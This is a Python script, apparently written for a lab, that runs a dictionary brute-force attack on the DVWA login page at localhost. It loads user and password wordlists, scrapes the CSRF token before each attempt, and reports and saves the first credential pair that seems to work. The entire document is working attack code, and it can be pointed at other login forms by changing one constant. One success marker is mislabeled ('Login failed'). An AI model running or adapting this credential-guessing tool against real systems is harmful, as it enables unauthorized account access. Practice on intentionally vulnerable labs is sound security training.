#!/usr/bin/env python3
# brute_dvwa.py
# Uso: python3 brute_dvwa.py users.txt passwords.txt
# Requiere: pip install requests beautifulsoup4

import sys, time
import requests
from bs4 import BeautifulSoup
from itertools import product

if len(sys.argv) != 3:
    print("Usage: python3 brute_dvwa.py users.txt passwords.txt")
    sys.exit(1)

USERS_FILE = sys.argv[1]
PWDS_FILE = sys.argv[2]
BASE = "http://localhost"
FORM_PATH = "/login.php"
FAIL_MARK = "Username and/or password incorrect."   # cadena de fallo tal como aparece en la web
SUCCESS_MARK = "Login failed"  # opcional: alguna cadena que indique éxito

# parámetros que puedes ajustar
DELAY = 0.25   # segundos entre intentos para no saturar el servidor

with open(USERS_FILE) as fh:
    users = [l.strip() for l in fh if l.strip()]

with open(PWDS_FILE) as fh:
    pwds = [l.strip() for l in fh if l.strip()]

def get_token_and_cookies(session):
    """GET formulario y extrae user_token; session mantiene cookies."""
    r = session.get(BASE + FORM_PATH, allow_redirects=True, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    token_tag = soup.find("input", {"name": "user_token"})
    token = token_tag["value"] if token_tag and token_tag.has_attr("value") else ""
    return token

def attempt(session, user, pwd):
    token = get_token_and_cookies(session)
    data = {
        "username": user,
        "password": pwd,
        "Login": "Login",
        "user_token": token
    }
    # enviar POST usando la misma sesión (cookies preservadas)
    r = session.post(BASE + FORM_PATH, data=data, allow_redirects=True, timeout=10)
    body = r.text
    # decisión: si no aparece FAIL_MARK, consideramos posible éxito
    if FAIL_MARK not in body:
        # mejor comprobación: ver si hay algún indicador claro de éxito
        if SUCCESS_MARK in body or "Logout" in body or "Welcome" in body:
            return True, body
        # si no hay marca de fallo, devolver True (posible) pero registrar body para revisión
        return True, body
    return False, body

# iterar combinaciones (usa product o cambia a otro orden si quieres)
for user in users:
    for pwd in pwds:
        sess = requests.Session()
        sess.headers.update({"User-Agent": "brute-lab/1.0"})
        ok, body = attempt(sess, user, pwd)
        if ok:
            print(f"[+] Posible credencial válida: {user}:{pwd}")
            open("success_response.html", "w").write(body)
            sys.exit(0)
        else:
            print(f"[-] {user}:{pwd} -> incorrect")
        time.sleep(DELAY)

print("Hecho. No se detectaron credenciales válidas.")

